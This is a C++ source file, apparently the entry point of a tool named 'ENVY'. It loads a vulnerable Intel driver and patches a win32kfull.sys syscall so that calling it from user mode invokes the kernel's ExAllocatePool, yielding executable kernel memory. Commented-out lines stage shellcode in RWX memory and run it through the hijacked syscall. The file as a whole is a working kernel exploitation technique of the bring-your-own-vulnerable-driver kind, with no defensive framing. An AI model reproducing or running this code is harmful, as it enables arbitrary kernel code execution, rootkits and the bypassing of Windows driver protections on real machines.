#define USING_INTEL_DRIVER

#ifdef USING_INTEL_DRIVER
#include "shittel_driver.h"
#include "shittel_driver_defs.h"
#endif 



#include "kernel_module.h"
#include <filesystem>

using namespace kernel;

int main(int argc, char** args)
{
	std::cout << "[+] Welcome to ENVY..." << std::endl;
	std::cout << "[+] Loading vulnerable driver..." << std::endl;
	std::unique_ptr<kernel::vulnerable_driver> driver_resource = std::unique_ptr<kernel::vulnerable_driver>(new intel::intel_vulnerable_driver());
	
	//kernel_module* module = kernel_module::get_kernel_module("win32kbase.sys");
	//kernel_module* ntkrnl = kernel_module::get_kernel_module("ntoskrnl.exe");
	//kernel_module* win32u = kernel_module::get_kernel_module("win32kfull.sys");
	//uint64_t vulnerable_syscall = win32u->get_module_export(driver_resource.get(), "NtGdiGetCOPPCompatibleOPMInformation");
	//std::cout << *module;
	//std::cout << *ntkrnl;

	//uint8_t shellbytes[] = { 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x90, 0xC3};

	//uint64_t shellcode_buffer = reinterpret_cast<uint64_t>(VirtualAlloc(nullptr, sizeof(shellbytes), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE));
	////win32u->patch_syscall(driver_resource.get(), shellcode_buffer);
	////win32u->execute_and_restore_syscall<void(*)(void)>(driver_resource.get());

	static uint64_t allocate_pool_kernel_addr = 0;

	kernel_module* ntoskrnl = kernel_module::get_kernel_module("ntoskrnl.exe");
	kernel_module* win32u = kernel_module::get_kernel_module("win32kfull.sys");

	if (allocate_pool_kernel_addr == 0)
		allocate_pool_kernel_addr = ntoskrnl->get_module_export(driver_resource.get(), "ExAllocatePool");

	std::cout << "Kernel ExAllocatePool" << std::hex << allocate_pool_kernel_addr << std::dec << std::endl;

	uint64_t pool_addr = 0;

	std::cout << "BREAK!" << std::endl;
	
	win32u->patch_syscall(driver_resource.get(), allocate_pool_kernel_addr);
	{
		using fnExAllocatePool = PVOID(WINAPI*)(POOL_TYPE, SIZE_T);
		static const auto usermode_addr = reinterpret_cast<void*>(GetProcAddress(LoadLibrary("win32u.dll"), "NtGdiGetCOPPCompatibleOPMInformation"));
		fnExAllocatePool ExAllocatePool = reinterpret_cast<fnExAllocatePool>(usermode_addr);
		DebugBreak();
		pool_addr = (uint64_t)ExAllocatePool(POOL_TYPE::NonPagedPoolExecute, 0xC);
	}
	//win32u->restore_syscall(driver_resource.get());

	std::cout << "0x" << std::hex << pool_addr << std::dec << std::endl;
	//win32u->patch_syscall(driver_resource.get(), shellcode_buffer);
	//win32u->execute_and_restore_syscall<void>(driver_resource.get(), nullptr);

	//driver_resource->free_kernel_pool(shellcode_pool);



	return 0;
}